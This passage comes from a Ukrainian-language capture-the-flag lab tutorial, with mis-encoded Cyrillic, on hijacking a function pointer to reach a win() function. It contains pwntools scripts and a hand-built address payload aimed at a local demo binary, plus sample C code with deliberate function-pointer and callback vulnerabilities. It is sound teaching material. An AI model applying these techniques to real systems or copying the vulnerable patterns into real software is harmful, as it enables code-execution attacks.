    print(output)
except:
    log.warning("–ú–æ–∂–ª–∏–≤–æ –∑–∞—Ü–∏–∫–ª–µ–Ω–Ω—è –∞–±–æ –∫—Ä–∞—à")
```

–†–µ–∑—É–ª—å—Ç–∞—Ç: –ü—Ä–æ–≥—Ä–∞–º–∞ **–∑–∞—Ü–∏–∫–ª–∏—Ç—å—Å—è** (main –≤–∏–∫–ª–∏–∫–∞—î —Å–µ–±–µ –∑–Ω–æ–≤—É —ñ –∑–Ω–æ–≤—É) –∞–±–æ –∫—Ä–∞—à–Ω–µ.

### –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç 3: –í—ñ–¥–ø—Ä–∞–≤—Ç–µ –º–µ–Ω—à–µ 8 –±–∞–π—Ç

```python
#!/usr/bin/env python3
from pwn import *

io = process('../build/stage04_demo_no_offset')

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ —Ç—ñ–ª—å–∫–∏ 4 –±–∞–π—Ç–∏
io.send(b'AAAA')

try:
    output = io.recvall(timeout=1)
    print(f"–í–∏–≤—ñ–¥: {output}")
except:
    print("–ù—ñ—á–æ–≥–æ –Ω–µ –≤–∏–π—à–ª–æ")
```

–†–µ–∑—É–ª—å—Ç–∞—Ç: –ü—Ä–æ–≥—Ä–∞–º–∞ **–∑–∞–≤–µ—Ä—à—É—î—Ç—å—Å—è** –±–µ–∑ –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó:
```c
if(n != 8) return 0;  // n = 4, —Ç–æ–º—É –≤–∏—Ö–æ–¥–∏–º–æ
```

### –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç 4: –†—É—á–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ —á–µ—Ä–µ–∑ hexdump

```bash
# –°—Ç–≤–æ—Ä—ñ—Ç—å payload –≤—Ä—É—á–Ω—É
python3 -c "import sys; sys.stdout.buffer.write(b'\x36\x11\x40\x00\x00\x00\x00\x00')" > payload.bin

# –ü–æ–¥–∏–≤—ñ—Ç—å—Å—è –≤ hex
xxd payload.bin

# –ó–∞–ø—É—Å—Ç—ñ—Ç—å
cat payload.bin | ../build/stage04_demo_no_offset
```

## üí° –í–∞–∂–ª–∏–≤—ñ –∫–æ–Ω—Ü–µ–ø—Ü—ñ—ó

### 1. –ß–æ–º—É `__attribute__((noreturn))`?

```c
__attribute__((noreturn)) void win(void){
    puts("FLAG{STAGE4_DIRECT_JUMP}");
    fflush(stdout);
    _exit(0);  // –ó–∞–º—ñ—Å—Ç—å return
}
```

- `__attribute__((noreturn))` - –ø—ñ–¥–∫–∞–∑–∫–∞ –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä—É —â–æ —Ñ—É–Ω–∫—Ü—ñ—è –Ω–µ –ø–æ–≤–µ—Ä–Ω–µ—Ç—å—Å—è
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `_exit(0)` –∑–∞–º—ñ—Å—Ç—å `return`
- –¶–µ **–∫—Ä–∏—Ç–∏—á–Ω–æ –≤–∞–∂–ª–∏–≤–æ**: —è–∫–±–∏ win() –∑—Ä–æ–±–∏–ª–∞ `return`, –ø—Ä–æ–≥—Ä–∞–º–∞ –∫—Ä–∞—à–Ω—É–ª–∞ –± (–±–æ –Ω–µ–º–∞—î –∫—É–¥–∏ –ø–æ–≤–µ—Ä—Ç–∞—Ç–∏—Å—å - –º–∏ –ø—Ä–∏–π—à–ª–∏ –Ω–µ —á–µ—Ä–µ–∑ call!)

### 2. –†—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ call —Ç–∞ jmp

**–ù–æ—Ä–º–∞–ª—å–Ω–∏–π –≤–∏–∫–ª–∏–∫ (call):**
```asm
call win
; 1. –ó–±–µ—Ä–µ–≥—Ç–∏ –∞–¥—Ä–µ—Å—É –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –≤ —Å—Ç–µ–∫—É (push return_addr)
; 2. –ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ win
; 3. –ö–æ–ª–∏ win —Ä–æ–±–∏—Ç—å ret, –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—å –Ω–∞–∑–∞–¥
```

**–ù–∞—à –≤–∏–ø–∞–¥–æ–∫ (–ø—Ä—è–º–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è):**
```asm
mov rax, 0x401136
call rax
; –ê–±–æ –Ω–∞–≤—ñ—Ç—å:
jmp rax
```

–Ø–∫—â–æ `win()` –∑—Ä–æ–±–∏—Ç—å `ret`, –ø—Ä–æ—Ü–µ—Å–æ—Ä —Å–ø—Ä–æ–±—É—î –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—å –∑–∞ –∞–¥—Ä–µ—Å–æ—é –∑—ñ —Å—Ç–µ–∫—É, –∞–ª–µ —Ç–∞–º **—Å–º—ñ—Ç—Ç—è** ‚Üí –∫—Ä–∞—à!

–¢–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `_exit(0)` - –ø—Ä–∏–º—É—Å–æ–≤–µ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –ø—Ä–æ—Ü–µ—Å—É.

### 3. –ü–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –∑ –º–∞–π–±—É—Ç–Ω—ñ–º–∏ –µ—Ç–∞–ø–∞–º–∏

| –ï—Ç–∞–ø | –©–æ –∫–æ–Ω—Ç—Ä–æ–ª—é—î–º–æ | –°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å |
|------|----------------|------------|
| **Stage 04 (–∑–∞—Ä–∞–∑)** | –ü—Ä–æ—Å—Ç–æ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó | ‚≠ê‚òÜ‚òÜ‚òÜ‚òÜ |
| Stage 05 | –ê–¥—Ä–µ—Å—É + –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π offset | ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ |
| Stage 06 | –ü–µ—Ä–µ–∑–∞–ø–∏—Å RIP —á–µ—Ä–µ–∑ BOF | ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ |
| Stage 07 | Leak –∞–¥—Ä–µ—Å–∏ + BOF | ‚≠ê‚≠ê‚≠ê‚òÜ‚òÜ |
| Stage 08 | Leak + ROP chain | ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ |

## üîê –ó–≤'—è–∑–æ–∫ –∑ —Ä–µ–∞–ª—å–Ω–æ—é –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—î—é

### –î–µ —Ü–µ –∑—É—Å—Ç—Ä—ñ—á–∞—î—Ç—å—Å—è –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç—ñ?

**–°—Ü–µ–Ω–∞—Ä—ñ–π 1: –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤ –ø–∞—Ä—Å–µ—Ä—ñ –∫–æ–º–∞–Ω–¥**
```c
void handle_command(char *cmd) {
    void (*handler)(void);

    // –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å: cmd –Ω–∞–ø—Ä—è–º—É –∫–æ–ø—ñ—é—î—Ç—å—Å—è –≤ handler
    memcpy(&handler, cmd, 8);
    handler();  // –í–∏–∫–ª–∏–∫–∞—î–º–æ!
}
```

**–°—Ü–µ–Ω–∞—Ä—ñ–π 2: –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –∑ callback**
```c
struct request {
    char data[64];
    void (*callback)(void);  // ‚Üê –ú–æ–∂–Ω–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏
};

void process(struct request *req) {
    // ... –æ–±—Ä–æ–±–∫–∞ ...
    req->callback();  // –í–∏–∫–æ–Ω–∞–Ω–Ω—è
}
```

**–°—Ü–µ–Ω–∞—Ä—ñ–π 3: Use-After-Free –∑ vtable**
```cpp
class Base {
    virtual void action() = 0;
};

// vtable –º—ñ—Å—Ç–∏—Ç—å –ø–æ–∫–∞–∂—á–∏–∫–∏ –Ω–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó
// –Ø–∫—â–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ vtable ‚Üí arbitrary code execution
```

## üìö –ù–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏

–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è –≤–∏ —Ä–æ–∑—É–º—ñ—î—Ç–µ:
- ‚úÖ –Ø–∫ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ –ø–æ–∫–∞–∂—á–∏–∫–∏ –ø—Ä–∞—Ü—é—é—Ç—å
- ‚úÖ –Ø–∫ –∞–¥—Ä–µ—Å–∞ —Å—Ç–∞—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º –∫–æ–¥—É
- ‚úÖ –ß–æ–º—É PIE OFF –ø–æ–ª–µ–≥—à—É—î –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é
- ‚úÖ –Ø–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ pwntools –¥–ª—è –ø–∞–∫—É–≤–∞–Ω–Ω—è –∞–¥—Ä–µ—Å

**–ì–æ—Ç–æ–≤—ñ –¥–æ Stage 05**: –¢–∞–º –¥–æ–¥–∞—Å—Ç—å—Å—è –∫–æ–Ω—Ü–µ–ø—Ü—ñ—è **offset** - –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –º—ñ—Å—Ü—è –¥–ª—è –∞–¥—Ä–µ—Å–∏ –≤ –±—É—Ñ–µ—Ä—ñ.

## ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

- [ ] –ó—ñ–±—Ä–∞–Ω–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫ —á–µ—Ä–µ–∑ `build.sh`
- [ ] –ó–Ω–∞–π–¥–µ–Ω–æ –∞–¥—Ä–µ—Å—É win() —á–µ—Ä–µ–∑ objdump –∞–±–æ pwntools
- [ ] –ó—Ä–æ–∑—É–º—ñ–ª–æ —â–æ —Ç–∞–∫–µ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∏–π –ø–æ–∫–∞–∂—á–∏–∫
- [ ] –°—Ç–≤–æ—Ä–µ–Ω–æ —Ä–æ–±–æ—á–∏–π exploit.py
- [ ] –û—Ç—Ä–∏–º–∞–Ω–æ –ø—Ä–∞–ø–æ—Ä FLAG{STAGE4_DIRECT_JUMP}
- [ ] –ó—Ä–æ–∑—É–º—ñ–ª–æ —á–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è p64()
- [ ] –ó—Ä–æ–∑—É–º—ñ–ª–æ —á–æ–º—É –≤–∞–∂–ª–∏–≤–æ 8 –±–∞–π—Ç
- [ ] –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç—É–≤–∞–ª–∏ –∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–º–∏ –∞–¥—Ä–µ—Å–∞–º–∏
- [ ] –ó—Ä–æ–∑—É–º—ñ–ª–æ —Ä—ñ–∑–Ω–∏—Ü—é –º—ñ–∂ call —Ç–∞ jmp
- [ ] –ì–æ—Ç–æ–≤–∏–π –¥–æ Stage 05!

---

**–ß–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:** 10-15 —Ö–≤–∏–ª–∏–Ω
**–°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å:** ‚≠ê‚òÜ‚òÜ‚òÜ‚òÜ (–¢—Ä–∏–≤—ñ–∞–ª—å–Ω–∞)
**–ö–∞—Ç–µ–≥–æ—Ä—ñ—è:** PWN / Control Flow
**–ö–ª—é—á–æ–≤—ñ –ø–æ–Ω—è—Ç—Ç—è:** Function pointers, PIE, Little Endian
